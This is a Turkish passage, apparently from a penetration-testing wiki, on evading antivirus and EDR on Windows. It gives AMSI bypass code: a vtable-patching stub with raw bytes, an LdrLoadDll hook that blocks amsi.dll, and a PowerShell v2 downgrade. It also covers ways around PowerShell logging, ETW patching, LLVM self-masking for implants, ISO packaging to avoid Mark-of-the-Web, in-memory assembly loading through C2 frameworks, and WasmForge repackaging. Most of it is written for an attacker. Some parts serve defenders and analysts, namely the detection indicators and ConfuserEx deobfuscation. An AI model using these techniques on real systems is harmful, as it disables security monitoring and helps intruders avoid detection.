Bir başka süreç-yerel bypass yöntemi, `AmsiScanBuffer` giriş noktasını olduğu gibi bırakır. Bildirilen 64-bit .NET loader'da, CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` kullanılarak bir AMSI COM nesnesi oluşturulur; `Marshal.GetIUnknownForObject()` arayüz işaretçisini verir ve `0x18` ofsetindeki vtable yuvası tarama çağrısının hedefi olarak kullanılır. Loader, `Console.Clear()` için yerel bir işaretçiye küçük bir x64 stub yazar, `VirtualProtect()` altında bu vtable girdisini stub olarak değiştirir, ardından özgün sayfa korumasını geri yükler. Hem 64-bit işaretçi genişliği hem de beklenen COM düzeni ön koşuldur; bu, rastgele AMSI arayüzleri veya derlemeleri için kullanılabilecek genel bir ofset değildir. Daha önce gözlemlenen aşamalar [imzalı AppDomainManager sidecar yüklemesi](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) ve [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml) aşamalarıdır.<sup>[[51]](#references)</sup>

Gözlemlenen stub baytları `41 C7 00 01 00 00 00 33 C0 C3` şeklindedir: `r8` içindeki sonuç işaretçisine **1** yazar ve `eax` içinde **0** döndürür. Dolayısıyla tarama sonucunun `AMSI_RESULT_CLEAN` (0) olduğu yönündeki bildirilen iddia, `S_OK` dönüş değerini çıktı enum değeriyle karıştırır. Belgelenen `AMSI_RESULT` sıralamasında **1**, `AMSI_RESULT_NOT_DETECTED` değeridir; yine de algılama eşiğinin altındadır.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### amsi.dll yüklenmesini engelleyerek AMSI'yi engelleme (LdrLoadDll hook)

AMSI yalnızca amsi.dll geçerli sürece yüklendikten sonra başlatılır. Sağlam ve dilden bağımsız bir bypass yöntemi, `ntdll!LdrLoadDll` üzerine istenen modül `amsi.dll` olduğunda hata döndüren bir user-mode hook yerleştirmektir. Böylece AMSI hiç yüklenmez ve o süreçte hiçbir tarama gerçekleşmez.<sup>[[23]](#references)</sup>

Uygulama taslağı (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve özel loader'larda çalışır (aksi hâlde AMSI yükleyecek her şeyde).
- Uzun komut satırı izlerini önlemek için bunu stdin üzerinden script göndermekle birlikte kullanın (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins üzerinden yürütülen loader'larda kullanıldığı görülmüştür (ör. `DllRegisterServer` çağıran `regsvr32`).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi atlamak için script oluşturur.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da imza tespitinden kaçınmak için rastgele oluşturulmuş, kullanıcı tanımlı işlevler, değişkenler ve karakter ifadeleri kullanan; ayrıca imzadan kaçınmak amacıyla PowerShell anahtar sözcüklerinde rastgele büyük/küçük harf kullanımı uygulayan AMSI atlama script'leri oluşturur.

**Tespit edilen imzayı kaldırma**

Geçerli işlemin belleğindeki tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçlar kullanabilirsiniz. Bu araç, geçerli işlemin belleğini AMSI imzası için tarar ve ardından bu imzanın üzerine NOP talimatları yazarak imzayı bellekten etkili bir şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2'yi kullanın**
PowerShell sürüm 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şöyle yapabilirsiniz:

```bash
powershell.exe -version 2
```

## PS Günlük Kaydı

PowerShell günlük kaydı, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Denetim ve sorun giderme amacıyla yararlı olabilir; ancak **tespit edilmekten kaçınmak isteyen saldırganlar için sorun oluşturabilir**.

PowerShell günlük kaydını atlatmak için şu teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakma**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell sürüm 2'yi kullanma**: PowerShell sürüm 2 kullanırsanız AMSI yüklenmez ve betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Şu komutla kullanabilirsiniz: `powershell.exe -version 2`
- **Yönetilmeyen bir PowerShell oturumu kullanma**: `powershell.exe`'i başlatmadan PowerShell'i barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu yöntem özellikle `powershell.exe` işlemine bağlı denetimleri atlatır; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz. Kapsam, çalışma zamanına ve ana makine uygulamasına bağlıdır.


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği verileri şifrelemeye dayanır. Bu, ikilinin entropisini artırarak AV ve EDR'ların dosyayı daha kolay tespit etmesine neden olur. Dikkatli olun ve şifrelemeyi yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulamayı değerlendirin.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2 (veya ticari fork'larını) kullanan zararlı yazılımları analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, sonrasında dnSpy veya ILSpy gibi araçlarda C#'a dönüştürülebilecek **neredeyse özgün IL'yi güvenilir biçimde geri yükler**.<sup>[[10]](#references)</sup>

1. Anti-tampering'i kaldırma – ConfuserEx her *method body*'yi şifreler ve şifreyi `<Module>.cctor` modülünün static constructor'ı içinde çözer. Ayrıca PE checksum'ını yamalayarak herhangi bir değişikliğin ikili dosyanın çökmesine neden olmasını sağlar. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly'yi yeniden yazmak için **AntiTamperKiller** kullanın:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output, kendi unpacker’ınızı oluştururken işe yarayabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / control-flow kurtarma – *clean* dosyayı **de4dot-cex**’e (de4dot’un ConfuserEx’i destekleyen fork’u) verin.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Bayraklar:
     • `-p crx` – ConfuserEx 2 profilini seçer
     • de4dot, control-flow flattening işlemini geri alır, özgün namespace’leri, sınıfları ve değişken adlarını geri yükler ve sabit dizeleri şifrelerini çözer.

3.  Proxy-call’ların kaldırılması – ConfuserEx, decompilation’ı daha da zorlaştırmak için doğrudan method çağrılarını hafif wrapper’larla (diğer adıyla *proxy call’lar*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Bu adımdan sonra `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API’lerini, opak wrapper işlevleri (`Class8.smethod_10`, …) yerine görmelisiniz.

4.  Manuel temizleme – Ortaya çıkan binary’yi dnSpy altında çalıştırın; gerçek payload’ı bulmak için büyük Base64 blob’larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğu zaman bunu `<Module>.byte_0` içinde başlatılan TLV kodlu bir byte array olarak saklar.

Yukarıdaki zincir, zararlı örneği çalıştırmaya **gerek kalmadan** yürütme akışını geri yükler; bu, çevrimdışı bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak önceliklendirmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir öznitelik oluşturur.

#### Tek satırlık komut
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla artırılmış yazılım güvenliği sunabilen, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sağlamaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, harici bir araç kullanmadan ve derleyiciyi değiştirmeden, derleme zamanında obfuscated kod üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı kırmak isteyen kişinin işini biraz daha zorlaştıracak, C++ template metaprogramming framework'ü tarafından oluşturulan obfuscated işlemlerden oluşan bir katman ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz; .exe, .dll ve .sys dahil olmak üzere çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele çalıştırılabilir dosyalar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan, LLVM destekli diller için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP chain'lerine dönüştürerek bir programı assembly code düzeyinde obfuscate eder ve böylece normal control flow'a dair doğal algımızı boşa çıkarır.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürüp yükleyebilir.

### LLVM compiler-assisted per-function self-masking

Bir implantın tamamını yalnızca uyku sırasında masklemek yerine, değiştirilmiş bir LLVM X86 backend'i seçilen işlevleri etkin olmadıkları sürece XOR-maskeli tutabilir. Function Peekaboo PoC'si, demangle edilmiş adları `REG_` içeren işlevleri seçer, son machine code'un etrafına position-independent giriş/çıkış stub'ları ekler ve `.text` içinde ortak bir masking handler üretir; kaynak düzeyindeki imzalar ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Bu işlem instruction selection ve optimization sonrasında yapılmalıdır; çünkü dönüşümün **her üretilen return'ü** kapsaması ve x86 yerleşiminin tam olarak bilinmesi gerekir. Emission öncesi bir `MachineFunctionPass`, son `MachineInstr::isReturn()` talimatını bulur, son yolun eklenen epilogue'a düşmesi için bunu siler ve önceki return'leri `JMP_1 handler` ile değiştirir. Her return'den önce derleyicinin ürettiği stack/frame teardown talimatlarını koruyun; yalnızca return talimatının kendisini yönlendirin.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `emitFunctionBodyEnd()` işlev başına stub'ları, `emitEndOfAsmFile()` ise handler'ı üretir. Emission aşamaları arasında paylaşılan semboller, prologue'daki bir branch'in daha sonra gelecek epilogue'u hedeflemesini sağlar. Elle üretilen yakın bir `je` için `0F 84` yazın ve ardından dört baytlık MC ifadesi olan `target - address_after_je` değerini ekleyin. Handler'a yapılan call ve jump'lar bunun yerine `MCInst` nesneleriyle (`CALL64pcrel32` ve `JMP_1`) üretilebilir. Değişiklik yapmadığı seçilmemiş bir işlev için pass `false` döndürmelidir; PoC bu durumda yanlışlıkla `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata ve pre-CRT initialization

PoC, `.funcmeta` içinde bir XOR key'i ve loader tarafından yeniden konumlandırılmış bir function pointer ile runtime length içeren 16 baytlık kayıtlar tutar. C alanı `uint32_t` olsa da handler, kayıt içindeki `+8` offset'inde bir QWORD'a erişerek uzunluğu ve padding'ini birlikte okur ve kayıtlar arasında `0x10` ilerler. PE section adları yalnızca sekiz bayt olduğundan, runtime araması `.funcmet` adını görür. Harici bir patcher, çalıştırılabilir bir `.stub` ekler, stub içine eski entry-point RVA'yı kaydeder ve `AddressOfEntryPoint` değerini yönlendirir. PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` üzerinden alır, önceden import edilmiş bir `VirtualProtect` işlevini çözmek için PE32+ import'larını tarar ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` içine bir sentinel yazar ve metadata'daki her işlevi çağırır. Sürekli okunabilir durumda kalan prologue, işlev başlangıcını `gs:[0xF0]` içine kaydeder, sentinel'i algılar ve henüz maskelenmemiş body'yi atlar. Ardından epilogue `call handler` kullanır; handler 13 register'ı (`0x68` bayt) kaydettikten sonra, `[rsp+0x68]` adresindeki return address, dönüştürülmüş işlevin sonunu gösterir. Böylece `end - start` hesaplanıp metadata kaydına yazılabilir. Tüm body'ler maskelendikten sonra stub sentinel'i temizler ve `ImageBase + original_entry_point_RVA` adresine atlar.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir call sırasında prologue, body'nin şifresini çözmek için aynı simetrik handler'ı çağırır. Son yol eklenen epilogue'a düşerken, önceki her return doğrudan ortak handler'a atlar. Normal epilogue da `call` yerine `jmp handler` kullanır; böylece yeniden maskeleme sonrasında handler'ın `ret` talimatı, çağıranın orijinal return address'ini tüketir ve işlev sonucunu `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive ve analiz göstergeleri

Handler mevcut kaydı bulur, sabit ve görünür prologue'u (bu build'de `0x46` bayt) atlar, geri kalan kısmın korumasını `PAGE_EXECUTE_READWRITE` olarak değiştirir, düşük key baytını kullanarak her bayta XOR uygular ve ardından korumayı `PAGE_EXECUTE_READ` olarak ayarlar. Böylece aynı döngü girişte şifreyi çözer, her normal çıkışta ise yeniden şifreler.<sup>[[38]](#references)[[39]](#references)</sup>

Bu tasarımın yüksek sinyalli göstergeleri şunlardır:<sup>[[38]](#references)[[39]](#references)</sup>

- çalıştırılabilir bir `.stub` içindeki entry point ve key ile yeniden konumlandırılmış `.text` pointer'larını tutan bir `.funcmet` section'ı;
- pre-CRT PEB, import table ve section table ayrıştırmasının ardından her metadata pointer'ı üzerinden yapılan call'lar;
- birbirinin aynısı `call`/`pop` PIC prologue'ları ve çok sayıda return noktasının tek bir handler'a yönlendirilmesi;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` adreslerine yazılması; ardından tekrarlanan `VirtualProtect` geçişleri ve image-backed executable page'lere yapılan bytewise XOR yazımları.

Bu, memory-scanner evasion'dır; cryptographic protection değildir: patch'lenmiş dosya hâlâ orijinal, maskelenmemiş body'yi içerir ve bir debugger `VirtualProtect` veya XOR döngüsünde duraklayıp etkin işlevi dump edebilir. Tek baytlık XOR, okunabilir metadata ve sabit `0x46` sınırı da çevrimdışı kurtarmayı kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'deki TEB slotları thread-local olsa da değiştirilmiş code page'leri process-wide'dır. Bu nedenle eşzamanlı veya recursive giriş, başka bir invocation çalışırken talimatları yeniden toggle edebilir; exception'lar ve nonlocal exit'ler de yeniden maskelemeyi atlayabilir. Sağlam bir uygulama geçişleri synchronize etmeli, `lpflOldProtect` üzerinden döndürülen gerçek korumayı geri yüklemeli, hard-coded stub uzunluklarından kaçınmalı, x64 stack alignment açısından hem `call` hem de `jmp` yollarını denetlemeli ve executable byte'ları yeniden yazdıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, executable code değiştirildiğinde instruction-cache coherency sorumluluğunu açıkça çağırana yükler.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

İnternetten bazı executable dosyalarını indirip çalıştırdığınızda bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak zararlı uygulamaları çalıştırmaya karşı korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen çoğunlukla itibara dayalı bir yaklaşım kullanır; yani nadiren indirilen uygulamalar SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve dosyayı çalıştırmasını engeller (ancak More Info -> Run anyway seçeneğine tıklanarak dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adlı bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir. İnternetten indirilen dosyalara, indirildikleri URL ile birlikte otomatik olarak eklenir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir imzalama sertifikasıyla imzalanmış executable dosyaların **SmartScreen'i tetiklemeyeceğini** unutmayın.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili bir yolu, onları ISO gibi bir tür container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **NTFS olmayan** volume'lere uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak için payload'ları çıktı container'larına paketleyen bir araçtır.

Kullanım örneği:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları günlüğe kaydetmesini** sağlayan güçlü bir günlükleme mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, kullanıcı alanındaki sürecin **`EtwEventWrite`** işlevinin herhangi bir olayı günlüğe kaydetmeden hemen dönmesini sağlamak da mümkündür. Bunun için işlev bellekte yamalanarak hemen dönmesi sağlanır; böylece o süreç için ETW günlüklemesi etkili bir şekilde devre dışı bırakılır.

Daha fazla bilgiye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinden ulaşabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini belleğe yükleme yöntemi uzun zamandır biliniyor ve post-exploitation araçlarınızı AV'ye yakalanmadan çalıştırmanın hâlâ çok etkili bir yolu.

Payload doğrudan belleğe yükleneceğinden ve diske yazılmayacağından, yalnızca tüm süreç için AMSI'yi yamalamamız gerekir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma özelliğini zaten sunuyor, ancak bunu yapmanın farklı yolları var:

- **Fork\&Run**

Bu yöntem, **yeni bir geçici süreç başlatmayı**, post-exploitation amaçlı kötü amaçlı kodunuzu bu yeni sürece enjekte etmeyi, kodunuzu çalıştırmayı ve işiniz bittiğinde yeni süreci sonlandırmayı içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, yürütmenin Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation işleminizde bir sorun çıkarsa veya yakalanırsa, **implantınızın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma **olasılığınızın daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation amaçlı kötü amaçlı kodu **kendi sürecine** enjekte etmeyi içerir. Böylece yeni bir süreç oluşturup AV tarafından taranmasını önleyebilirsiniz. Ancak payload'unuzun yürütülmesi sırasında bir sorun çıkarsa süreç çökebileceğinden, **beacon'ınızı kaybetme olasılığınız çok daha yüksektir**.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek isterseniz şu makaleye [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'larına ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assembly'lerini **PowerShell üzerinden** de yükleyebilirsiniz. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) kaynaklarına göz atın.

## .NET araçlarının NativeAOT WebAssembly ile yeniden paketlenmesi (WasmForge)

Normal `execute-assembly` teknikleri, tanınabilir MSIL'i korur ve sonunda bir CLR başlatır. **WasmForge** bunun yerine yürütme altyapısını değiştirir: Bir C# projesini deneysel NativeAOT-LLVM WASI hedef platformuna taşır, önceden WebAssembly olarak derler ve modülü Wazero tabanlı bir Windows PE ana bilgisayarına gömer. Ortaya çıkan süreç hedef sistemdeki CLR, JIT veya `dotnet` ana bilgisayarına ihtiyaç duymaz; bu nedenle yalnızca yönetilen assembly adlarına, CLR yüklemesine, AMSI'ye veya .NET ETW'ye dayanan kurallar doğrudan görünürlüğünü kaybeder. Bu bir kaçınma/paketleme tekniğidir, ayrıcalık sınırını aşma yöntemi değildir; konuk süreç, orijinal aracın izinlerini ve gözlemlenebilir işletim sistemi davranışlarını korur.<sup>[[44]](#references)[[45]](#references)</sup>

### C# projesi derleme

Önerilen derleme yöntemi, .NET 10 SDK'sını, NativeAOT-LLVM workload'unu, WASI SDK 24.0'ı, linker'ı ve imzalama bağımlılıklarını içerdiği için projenin Docker ortamını kullanmaktır. `.csproj` dosyası otomatik olarak algılanır; tek komutla yapılan derleme taşıma, uyumluluk yamalama, WASM derlemesi, PE oluşturma ve imzalama işlemlerini gerçekleştirir.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Sorun giderme veya oluşturulan kodu inceleme için süreci `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` ve son olarak `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` adımlarına bölün. Derleme imajı ayrıca WASI Preview 2 component encoding kullanımını önlemek ve gömülü runtime'ın beklediği düz modülü üretmek için bir `wasm-component-ld` wrapper'ı kullanır.<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# ile x64 Win32 Arasında Köprü Kurma

Bu, şeffaf bir yeniden derleme değildir. NativeAOT-WASI, Windows odaklı BCL özelliklerinden yoksundur veya bu özellikleri değiştirir; wasm32 guest normalde dört baytlık pointer yuvaları ayırırken x64 API'leri sekiz baytlık pointer'lar döndürebilir. WasmForge bu iki sorunu aşağıdaki oluşturulan katmanlarla giderir:<sup>[[44]](#references)</sup>

1. Bir source patcher, AOT'ye özgü anlamsal farklılıkları düzeltir ve desteklenmeyen registry, pipes, WMI, identity, directory-service, file-version, LSA ve benzeri çağrıları `Wf*` yardımcılarına yönlendirir.
2. Bir P/Invoke tarayıcısı, `[DllImport]` çağrılarının guest içinde belirtilen DLL'yi dinamik olarak yüklemek yerine bağlantılı C bridge sembollerine bağlanması için NativeAOT `DirectPInvoke` eşlemeleri oluşturur.
3. Host'a bağlı pointer'lar C#'ta `ulong`, C'de `uint64_t` kullanır. Genel bir dispatcher çağrıyı host'un Win32 handler'ına iletir; `out8_mask`, üst yarıları korunması gereken gerçek sekiz baytlık çıktı yuvalarını işaretler. İşaretlenmemiş wasm32 biçimli çıktılarda, x64 yazma işleminin bitişik dört baytı bozmasını önlemek için snapshot/restore koruması kullanılır.
4. Özel host bridge'leri, LSA ticket-cache erişimi, yapılandırılmış sonuçlar içeren Kerberos/BCrypt işlemleri, TCP KDC trafiği ve LDAP sorguları gibi genel syscall dispatch'e uymayan işlemleri gerçekleştirir.

Örneğin, `version.dll!VerQueryValueW` için bir wrapper dört host adresini iletir ve 2. ve 3. bitleri (`0xC`) ayarlar; çünkü value pointer ve length, sekiz baytlık çıktı yuvalarıdır. Wrapper'ın kendisi genel kalır ve DLL adını, export adını, argümanları ve mask'i `wf_call_v2`'ye devreder; host pointer çevirisini yapar ve native API'yi çağırır.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Sınırlamalar ve tespit pivotları

Reflection ağırlıklı kodlar, dinamik assembly yükleme, keyfi native callback'ler ve WASM belleğine döndürülen karmaşık x64 yapıları yine de araç başına yamalar gerektirebilir veya tamamen başarısız olabilir. Genel WASI Preview 2 socket'leri no-op stub'lara da ulaşabilir; bu nedenle desteklenen araçlar protokole özgü host shim'leri kullanır. Özellik eşitliğini varsaymak yerine her komutu native bir build ile doğrulayın.<sup>[[44]](#references)[[45]](#references)</sup>

Bu teknik payload'ı görünmez kılmak yerine telemetriyi başka yöne kaydırır. Tespit; WASM modülü içeren veya bellekte oluşturan bir PE'ye, Wazero benzeri runtime davranışına, olağandışı host/guest bellek ayırma ve kopyalama işlemlerine, genel doğrudan Win32 çağrılarına, imza ve PE kaynağı anormalliklerine, ayrıca ortaya çıkan API çağrılarına ve ağ trafiğine yönelebilir. Bu nedenle CLR yükleme, AMSI veya .NET ETW olaylarının olmaması, bir sürecin zararsız olduğunun kanıtı olarak değerlendirilmemelidir.<sup>[[44]](#references)</sup>

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği gibi, güvenliği ihlal edilmiş makineye **Saldırganın Kontrolündeki SMB paylaşımında yüklü yorumlayıcı ortamına** erişim vererek diğer dillerde kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki Yorumlayıcı İkili Dosyalarına ve ortama erişim vererek bu dillerdeki **keyfi kodları, güvenliği ihlal edilmiş makinenin belleğinde** çalıştırabilirsiniz.

Depodaki açıklamaya göre: Defender betikleri taramaya devam eder; ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esneklik** elde ederiz. Bu dillerde rastgele, obfuscate edilmemiş reverse shell betikleriyle yapılan testler başarılı olmuştur.

## Statik analizden kaçınmak için WebAssembly'yi yeniden barındırma

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün access token'ını manipüle eder. Token'ın ayrıcalıklarını azaltmak, sürecin çalışmaya devam etmesini sağlarken ayrıcalıklı inceleme veya düzeltme işlemlerini gerçekleştirmesini engelleyebilir.

